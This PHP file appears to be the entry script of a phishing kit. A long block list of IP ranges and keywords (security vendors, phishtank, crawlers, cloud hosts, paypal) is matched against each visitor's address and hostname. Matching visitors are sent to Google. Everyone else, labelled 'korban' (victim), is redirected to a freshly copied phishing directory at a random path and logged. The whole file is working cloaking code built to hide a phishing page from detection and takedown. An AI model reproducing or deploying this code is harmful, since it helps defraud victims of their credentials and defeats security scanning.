<?php
error_reporting(0);
include "ibc.php";
include "sc.php";
$blocked_words = array(
'amazon',
'aruba',
'above',
'google',
'tor',
'217.182.175.122',
'196.125.235.134',
'163.172.240.97',
'185.187.',
'softlayer',
'amazonaws',
'cyveillance',
'phishtank',
'dreamhost',
'nux',
'netpilot',
'calyxinstitute',
'tor-exit',
'103.10.',
'104.42.',
'134.90.',
'138.199.',
'139.99.',
'154.16.',
'157.230.',
'159.65.',
'167.172.',
'174.138.',
'185.253.',
'193.105.',
'194.99.',
'198.50.',
'204.101.',
'205.169.',
'212.102.',
'217.138.',
'252.231.',
'37.120.',
'37.252.',
'38.205.',
'40.94.',
'45.134.',
'51.89.',
'52.177.',
'52.188.',
'52.234.',
'52.250.',
'54.36.',
'63.192.',
'65.154.',
'67.218.',
'68.183.',
'77.74.',
'80.44.',
'80.79.',
'84.17.',
'87.115.',
'89.238.',
'90.163.',
'91.103.',
'93.177.',
'cdn77.com', 
'msnbot',
'p3pwgdsn',
'netcraft',
'194.72.238',
'69.164.111.198',
'82.251.180.148',
'banff',
'auchroisk',
'trendmicro',
'ebay',
'paypal',
'torservers',
'37.170.160.245',
'comodo',
'crawl',
'sucuri.net',
'crawler',
'proxy',
'enom',
'cloudflare',
'yahoo',
'trustwave', 
'tfbnw.net', 
'pacbell.net', 
'tpnet.pl', 
'ovh', 
'centralnic', 
'badware',
'phishing',
'antivirus',
'SiteAdvisor',
'McAfee',
'Bitdefender',
'barracuda',
'anti',
'avast',
'mail',
'phis',
'tester',
'bit',
'security',
'secure',
'reverse',
'52.168.72.225',
'cloud',
'162.243.187.126',
'46.101.94.163',
'46.101.119.24',
'92.188.58.29',
'23.251.157.37',
'35.238.73.233',
'35.238.119.185',
'82.226.89.186',
'86.253.252.249',
'193.252.110.10',
'194.206.77.57',
'91.213.143.248',
'37.187.173.10',
'178.213.64.34',
'178.213.64.35'
);

$today = getdate();
$date = ''.$today['weekday'].' - '.$today['mday'].' '.$today['month'].' '.$today['year'].' - '.$today['hours'].':'.$today['minutes'].':'.$today['seconds'].'';


function inStr($s, $as){
    $s = strtoupper($s);
    if(!is_array($as)) $as=array($as);
    for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
    return false;
}

$host_korban = ''.$_SERVER['REMOTE_ADDR'].' - '.gethostbyaddr($_SERVER['REMOTE_ADDR']).'';

if(inStr($host_korban, $blocked_words)){
    $file = fopen("data-.txt","a");
    fwrite($file, $date." : ".$_SERVER['REMOTE_ADDR']." - ".gethostbyaddr($_SERVER['REMOTE_ADDR'])."\n");
    fclose($file);
    header('Location: http://www.google.com/');
    exit();
}else{
    $random = rand(0,100000000000);
$DIR    = substr(md5($random), 0, 15);
function recurse_copy($home,$DIR) {
$dir = opendir($home);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($home . '/' . $file) ) {
recurse_copy($home . '/' . $file,$DIR . '/' . $file);
}
else {
copy($home . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$home="resi";
recurse_copy( $home, $DIR );
header("location:$DIR");
$file = fopen("vuu.txt","a");
fwrite($file,$ip2."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$CountryData | $os | $br] \n");

}

?>